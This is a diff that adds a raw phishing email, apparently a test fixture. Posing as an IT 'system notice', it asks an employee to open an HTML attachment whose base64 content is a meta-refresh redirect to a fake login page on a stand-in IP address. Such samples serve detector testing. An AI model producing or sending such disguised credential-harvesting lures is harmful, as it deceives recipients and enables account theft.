@@ -1,0 +1,19 @@
+From: =?utf-8?B?5rWL6K+V5pSv5oyB?= <it-support@partner.example>
+To: employee@corp.internal
+Date: Thu, 13 Aug 2026 10:00:00 +0800
+Message-ID: <ev57@partner.example>
+Subject: 系统通知
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BS"
+
+--BS
+Content-Type: text/plain; charset=utf-8
+
+您好，请打开附件处理。--BS
+Content-Type: text/html
+Content-Disposition: attachment; filename="账户异常验证入口.html"
+Content-Transfer-Encoding: base64
+
+PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0ncmVmcmVzaCcgY29udGVudD0nMDt1cmw9aHR0cDovLzIwMy4wLjExMy42MC92ZXJpZnkvbG9naW4nPjwvaGVhZD48Ym9keT5sb2FkaW5n4oCmPC9ib2R5PjwvaHRtbD4=
+--BS--
+
